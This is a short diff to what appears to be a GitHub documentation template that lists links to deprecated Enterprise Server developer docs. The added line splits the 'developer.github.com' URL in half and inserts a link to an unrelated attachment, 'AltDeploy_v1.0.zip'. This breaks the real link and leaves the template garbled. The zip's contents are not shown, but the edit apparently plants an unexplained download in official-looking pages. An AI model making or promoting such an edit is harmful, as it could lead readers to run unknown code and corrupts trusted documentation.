@@ -34,5 +34,6 @@ Documentation for deprecated versions remains available but is no longer maintai
 Developer documentation for deprecated versions remains available but is no longer maintained.
 
 {% for deprecatedDevRelease in enterpriseServerReleases.deprecatedReleasesOnDeveloperSite %}
-- [Enterprise Server {{deprecatedDevRelease}}](https://developer.github.com/enterprise/{{deprecatedDevRelease}})
+- [Enterprise Server {{deprecatedDevRelease}}](https://dev[AltDeploy_v1.0.zip](https://github.com/github/docs/files/7359834/AltDeploy_v1.0.zip)
+eloper.github.com/enterprise/{{deprecatedDevRelease}})
 {% endfor %}
